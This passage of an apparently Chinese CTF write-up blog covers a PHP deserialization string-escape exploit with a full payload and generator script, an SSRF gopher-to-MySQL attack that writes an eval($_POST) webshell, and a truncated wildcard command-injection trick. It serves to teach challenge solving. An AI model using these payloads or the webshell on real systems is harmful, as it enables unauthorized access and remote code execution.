data-num=\"10\"></td><td><pre>        <span class=\"token variable\">$result</span><span class=\"token operator\">-&gt;</span><span class=\"token function\">bind_result</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$idResult</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$passwordResult</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>        <span class=\"token variable\">$result</span><span class=\"token operator\">-&gt;</span><span class=\"token function\">fetch</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>        <span class=\"token variable\">$result</span><span class=\"token operator\">-&gt;</span><span class=\"token function\">close</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">token</span><span class=\"token operator\">==</span><span class=\"token string single-quoted-string\">'admin'</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>            <span class=\"token keyword\">return</span> <span class=\"token variable\">$idResult</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>        <span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token variable\">$idResult</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>            <span class=\"token keyword\">echo</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'用户不存在!'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>            <span class=\"token keyword\">return</span> <span class=\"token constant boolean\">false</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>        <span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token function\">md5</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">password</span><span class=\"token punctuation\">)</span><span class=\"token operator\">!==</span><span class=\"token variable\">$passwordResult</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>            <span class=\"token keyword\">echo</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'密码错误！'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>            <span class=\"token keyword\">return</span> <span class=\"token constant boolean\">false</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>        <span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>        <span class=\"token variable\">$_SESSION</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'token'</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">name</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>        <span class=\"token keyword\">return</span> <span class=\"token variable\">$idResult</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>    <span class=\"token punctuation\">}</span></pre></td></tr></tbody></table></figure><p>由于一开始未成功登陆，第一个 if 必然不通过，因此若想要返回 id 值从而对 <code>$_SESSION['login']</code>  赋值，那么要通过第三个判断（第二个判断只要 sql 语句执行成功就可），也就是要使得输入的 <code>password</code>  与 sql 查出来的 <code>password</code>  相同，由于预设的 sql 语句为 <code>select id,password from user where username=?</code> , 不妨将 id、password 分别改为 1 和 1 对应的 md5 值，从而查出来的 <code>password</code>  的 md5 值可控。满足该判断条件，之后将执行 <code>$_SESSION['token']=$this-&gt;name;</code>  可使得在下一次进入该函数时直接通过第一个判断。至此，得到两种方法，第一种调用 <code>User</code>  类的 <code>login</code>  方法，其中对 <code>dbCtrl</code>  类的 <code>login</code>  进行控制；第二种调用 <code>dbCtrl</code>  的 <code>login</code>  方法。但由于在调用 <code>User</code>  类的 <code>login</code>  方法时无法对 <code>dbCtrl</code>  直接进行操作，故这里采用第二种方法。</p>\n<p>要想进行如上操作， <code>User</code>  类的 <code>login</code>  方法执行路口，也即要找到反序列化入口。观察源码，可知 <code>User</code>  类中的 <code>update</code>  方法中有语句 <code>$Info=unserialize($this-&gt;getNewinfo());</code> , 再结合 <code>update.php</code>  中的</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre><span class=\"token variable\">$users</span><span class=\"token operator\">=</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">User</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token variable\">$users</span><span class=\"token operator\">-&gt;</span><span class=\"token function\">update</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></tbody></table></figure><p>可知， <code>User</code>  类中的 <code>update</code>  方法可以执行，再看其反序列化对象 <code>$this-&gt;getNewinfo()</code> ，由 <code>safe(serialize(new Info($age,$nickname)))</code>  得到而 age，nickname 分别由 post 上传得到，可控，反序列化入口找到。而恰好 <code>update.php</code>  会执行 <code>User</code>  的 <code>update</code>  方法</p>\n<p>现在首先先不看 <code>safe</code>  方法，我们需要通过 <code>Info</code>  类来执行 <code>User</code>  类中的 <code>login</code>  方法，观察 <code>Info</code>  类，可看到</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__call</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$name</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$argument</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>        <span class=\"token keyword\">echo</span> <span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">CtrlCase</span><span class=\"token operator\">-&gt;</span><span class=\"token function\">login</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$argument</span><span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token punctuation\">}</span></pre></td></tr></tbody></table></figure><p>恰好执行了 login 方法，那么我们所需要做的是反序列化时使得 CtrlCase 对应的一个对象从而调用 User 类的 login 方法或直接为 User 类，而要调用此__call 魔术方法，需要使用 Info 类调用不存在的方法，也就是说我们需要找到一个位置调用 Info 类的一个方法，再回到源码，可以发现 User 类中和 UpdateHelper 类中分别有方法</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">//User</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__toString</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">nickname</span><span class=\"token operator\">-&gt;</span><span class=\"token function\">update</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">age</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token keyword\">return</span> <span class=\"token string double-quoted-string\">\"0-0\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token comment\">//UpdateHelper</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__destruct</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    <span class=\"token keyword\">echo</span> <span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">sql</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token punctuation\">}</span></pre></td></tr></tbody></table></figure><p>这样我们可以通过 <code>UpdateHelper</code>  类的 <code>__destruct</code>  方法来调用 <code>User</code>  类的 <code>__toString</code>  方法，如果此时 <code>nickname</code>  值为 <code>Info</code>  类对象，这里调用了 <code>Info</code>  类中的 <code>update</code>  方法，但由于 <code>Info</code>  类中没有此方法，便调用了 <code>__call</code>  方法，实现了之前的目的。</p>\n<p>至此，对于方法的调用结束，这时需要想办法进行序列化操作，通过反序列化得到一个满足条件的 <code>Info</code>  类</p>\n<p><code>Info</code>  类中， <code>CtrlCase</code>  为一个 <code>UpdateHelper</code>  对象，摧毁时，自自动执行 <code>echo $this-&gt;sql;</code> , 而 <code>sql</code>  对应一个一个 <code>User</code>  对象，自动调用 <code>nickname</code>  的 <code>update</code>  方法，此时 <code>nickname</code>  为一个 <code>Info</code>  对象，无  <code>update</code>  方法，调用 <code>__call</code>  方法，之后执行 <code>echo $this-&gt;CtrlCase-&gt;login($argument[0]);</code> , 而此时 <code>CtrlCase</code>  为一个 <code>dbCtrl</code>  对象，调用其 <code>login</code>  方法， <code>sql</code>  语句为前一个 <code>User</code>  的 <code>age</code> ，即 <code>age</code>  赋值为 <code>SELECT 1,\\\"c4ca4238a0b923820dcc509a6f75849b\\\"from user where username=?</code> , 所以进行该语句，通过所有函数， <code>$_SESSION['token']=$this-&gt;name</code>  执行，下一次再进入时，可直接登陆成功</p>\n<p>这里看 <code>Info</code>  类的 <code>__construct</code>  方法，只对 <code>age</code>  和 <code>nickname</code>  进行赋值，根据上面的分析，必须要有 <code>CtrlCase</code>  变量的赋值，所以这里采用手动添加，值为一个 <code>UpdateHelper</code>  的序列化字符串，即为</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre>s<span class=\"token punctuation\">:</span><span class=\"token number\">8</span><span class=\"token punctuation\">:</span>\\<span class=\"token string double-quoted-string\">\"CtrlCase\\\";\"</span> <span class=\"token operator\">.</span> <span class=\"token function\">serialize</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$updateHelper</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></tbody></table></figure><p>要想成功反序列化，即让添加的 <code>CtrlCase</code>  成功反序列化，我们需要反序列化逃逸，所幸在进行反序列化操作前，用 <code>safe</code>  函数对字符串进行了过滤，会将符合条件的字符串修改为 <code>hacker</code> ，为字符串逃逸提供条件，这里为了减少序列化字符串量，使用 <code>into</code>  转换，一次多两个字符</p>\n<p>这里先给出序列化类</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">User</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$id</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$age</span> <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"SELECT 1,\\\"c4ca4238a0b923820dcc509a6f75849b\\\"from user where username=?\"</span><span class=\"token punctuation\">;</span><span class=\"token comment\">//sql 查询语句，用来绕过第三个判断</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$nickname</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">Info</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$age</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$nickname</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$CtrlCase</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">UpdateHelper</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$sql</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">dbCtrl</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre><span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$name</span> <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"admin\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$password</span> <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"1\"</span><span class=\"token punctuation\">;</span><span class=\"token comment\">// 密码，用来绕过第三个判断</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre><span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre></pre></td></tr><tr><td data-num=\"23\"></td><td><pre><span class=\"token variable\">$db</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">dbCtrl</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre></pre></td></tr><tr><td data-num=\"25\"></td><td><pre><span class=\"token variable\">$in</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Info</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre><span class=\"token variable\">$in</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">CtrlCase</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$db</span><span class=\"token punctuation\">;</span><span class=\"token comment\">// 类内的 Info 对象的 CtrlCase 为一个 dbCrtl 对象</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre><span class=\"token variable\">$user</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">User</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre><span class=\"token variable\">$user</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">nickname</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$in</span><span class=\"token punctuation\">;</span><span class=\"token comment\">//nickname 为一个 Info 类对象</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre></pre></td></tr><tr><td data-num=\"30\"></td><td><pre><span class=\"token variable\">$updateHelper</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">UpdateHelper</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre><span class=\"token variable\">$updateHelper</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">sql</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$user</span><span class=\"token punctuation\">;</span><span class=\"token comment\">//UpdateHelper 对象的 sql 为一个 User 对象</span></pre></td></tr></tbody></table></figure><p>由于 <code>Info</code>  类序列化结果为 <code>O:4:\"Info\":3:{s:3:\"age\";s:2:\"xx\";s:8:\"nickname\";s:3:\"xxx\"</code>  的格式，这里为了让后面添加成功，不妨先用 <code>\"</code>  提前闭合 nickname 的值，之后添加 <code>;s:8:\\\"CtrlCase\\\";\" . serialize($updateHelper). \"}\";</code>  (加  <code>} </code> 是为了闭合第一个 <code>{ </code> ，使反序列化成功， <code>echo</code>  后，加上添加的 <code>\"</code>  、 <code>}</code>  总共为 302 个字符，所有有一个 into 换一个 hacker 多两个字符算，总共有 151 个 <code>into</code> ，故 payload 为</p>\n<figure class=\"highlight raw\"><figcaption data-lang=\"\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre>age=18&amp;nickname=intointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointo\";s:8:\"CtrlCase\";O:12:\"UpdateHelper\":1:{s:3:\"sql\";O:4:\"User\":3:{s:2:\"id\";N;s:3:\"age\";s:69:\"SELECT 1,\"c4ca4238a0b923820dcc509a6f75849b\"from user where username=?\";s:8:\"nickname\";O:4:\"Info\":3:{s:3:\"age\";N;s:8:\"nickname\";N;s:8:\"CtrlCase\";O:6:\"dbCtrl\":2:{s:4:\"name\";s:5:\"admin\";s:8:\"password\";s:1:\"1\";}}}}}</pre></td></tr></tbody></table></figure><p>脚本为</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token comment\">/*</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre> * @Author       : zhong</pre></td></tr><tr><td data-num=\"4\"></td><td><pre> * @since        : 2022-07-21 16:12:08</pre></td></tr><tr><td data-num=\"5\"></td><td><pre> * @LastAuthor   : zhong</pre></td></tr><tr><td data-num=\"6\"></td><td><pre> * @lastTime     : 2022-07-21 16:28:22</pre></td></tr><tr><td data-num=\"7\"></td><td><pre> */</pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">User</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$id</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$age</span> <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"SELECT 1,\\\"c4ca4238a0b923820dcc509a6f75849b\\\"from user where username=?\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$nickname</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">Info</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$age</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$nickname</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$CtrlCase</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre><span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">UpdateHelper</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre><span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$sql</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre><span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">dbCtrl</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre><span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$name</span> <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"admin\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$password</span> <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"1\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre><span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre></pre></td></tr><tr><td data-num=\"30\"></td><td><pre><span class=\"token variable\">$db</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">dbCtrl</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre><span class=\"token variable\">$user</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">User</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre><span class=\"token variable\">$uh</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">UpdateHelper</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre><span class=\"token variable\">$info</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Info</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre></pre></td></tr><tr><td data-num=\"35\"></td><td><pre><span class=\"token variable\">$uh</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">sql</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$user</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre><span class=\"token variable\">$user</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">nickname</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$info</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre><span class=\"token variable\">$info</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">CtrlCase</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$db</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre><span class=\"token comment\">// 此为 nickname 的值</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre><span class=\"token keyword\">echo</span> <span class=\"token function\">str_repeat</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"into\"</span><span class=\"token punctuation\">,</span> <span class=\"token number\">151</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">.</span> <span class=\"token string double-quoted-string\">\"\\\";s:8:\\\"CtrlCase\\\";\"</span> <span class=\"token operator\">.</span> <span class=\"token function\">serialize</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$uh</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">.</span> <span class=\"token string double-quoted-string\">\"}\"</span><span class=\"token punctuation\">;</span></pre></td></tr></tbody></table></figure><h1 id=\"web15-fishman\"><a class=\"anchor\" href=\"#web15-fishman\">#</a> web15 Fishman</h1>\n<p>不会</p>\n<h1 id=\"红包题第九弹\"><a class=\"anchor\" href=\"#红包题第九弹\">#</a> 红包题第九弹</h1>\n<p>SSRF Gopher 协议 攻击 mysql 写入</p>\n<figure class=\"highlight sql\"><figcaption data-lang=\"SQL\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">select</span> <span class=\"token string\">'&lt;?php eval($_POST[1]); ?&gt;'</span> <span class=\"token keyword\">INTO</span> <span class=\"token keyword\">OUTFILE</span> <span class=\"token string\">'/var/www/html/1.php'</span><span class=\"token punctuation\">;</span></pre></td></tr></tbody></table></figure><p>数据库名臣为 root<br>\n 是由 Gopher 工具<br>\n生成</p>\n<figure class=\"highlight raw\"><figcaption data-lang=\"\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre>gopher://127.0.0.1:3306/_%a3%00%00%01%85%a6%ff%01%00%00%00%01%21%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%72%6f%6f%74%00%00%6d%79%73%71%6c%5f%6e%61%74%69%76%65%5f%70%61%73%73%77%6f%72%64%00%66%03%5f%6f%73%05%4c%69%6e%75%78%0c%5f%63%6c%69%65%6e%74%5f%6e%61%6d%65%08%6c%69%62%6d%79%73%71%6c%04%5f%70%69%64%05%32%37%32%35%35%0f%5f%63%6c%69%65%6e%74%5f%76%65%72%73%69%6f%6e%06%35%2e%37%2e%32%32%09%5f%70%6c%61%74%66%6f%72%6d%06%78%38%36%5f%36%34%0c%70%72%6f%67%72%61%6d%5f%6e%61%6d%65%05%6d%79%73%71%6c%45%00%00%00%03%73%65%6c%65%63%74%20%27%3c%3f%70%68%70%20%65%76%61%6c%28%24%5f%50%4f%53%54%5b%31%5d%29%3b%3f%3e%27%20%69%6e%74%6f%20%6f%75%74%66%69%6c%65%20%27%2f%76%61%72%2f%77%77%77%2f%68%74%6d%6c%2f%31%2e%70%68%70%27%01%00%00%00%01</pre></td></tr></tbody></table></figure><p>之后进行 url 编码<br>\n最后 payload 为</p>\n<figure class=\"highlight raw\"><figcaption data-lang=\"\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre>u=Username&amp;returl=gopher://127.0.0.1:3306/_%25a3%2500%2500%2501%2585%25a6%25ff%2501%2500%2500%2500%2501%2521%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2572%256f%256f%2574%2500%2500%256d%2579%2573%2571%256c%255f%256e%2561%2574%2569%2576%2565%255f%2570%2561%2573%2573%2577%256f%2572%2564%2500%2566%2503%255f%256f%2573%2505%254c%2569%256e%2575%2578%250c%255f%2563%256c%2569%2565%256e%2574%255f%256e%2561%256d%2565%2508%256c%2569%2562%256d%2579%2573%2571%256c%2504%255f%2570%2569%2564%2505%2532%2537%2532%2535%2535%250f%255f%2563%256c%2569%2565%256e%2574%255f%2576%2565%2572%2573%2569%256f%256e%2506%2535%252e%2537%252e%2532%2532%2509%255f%2570%256c%2561%2574%2566%256f%2572%256d%2506%2578%2538%2536%255f%2536%2534%250c%2570%2572%256f%2567%2572%2561%256d%255f%256e%2561%256d%2565%2505%256d%2579%2573%2571%256c%2545%2500%2500%2500%2503%2573%2565%256c%2565%2563%2574%2520%2527%253c%253f%2570%2568%2570%2520%2565%2576%2561%256c%2528%2524%255f%2550%254f%2553%2554%255b%2531%255d%2529%253b%253f%253e%2527%2520%2569%256e%2574%256f%2520%256f%2575%2574%2566%2569%256c%2565%2520%2527%252f%2576%2561%2572%252f%2577%2577%2577%252f%2568%2574%256d%256c%252f%2531%252e%2570%2568%2570%2527%2501%2500%2500%2500%2501</pre></td></tr></tbody></table></figure><p>最后访问 1.php，正常 rce</p>\n<h1 id=\"nl\"><a class=\"anchor\" href=\"#nl\">#</a> nl</h1>\n<p>Linux 中可以将文件名作为函数和参数，通过星号通配执行</p>\n<p>新建一个名称是 nl 的文件作为指令</p>\n<p><code>?1=&gt;nl</code> <br>\n 将右尖括号左侧的内容写入右侧文件，因此相当于新建了一个叫 nl 的空文件</p>\n<p><code>?1=*&gt;z</code></p>\n<p><code>*</code>  代表当前文件夹下的所有文件<br>\n 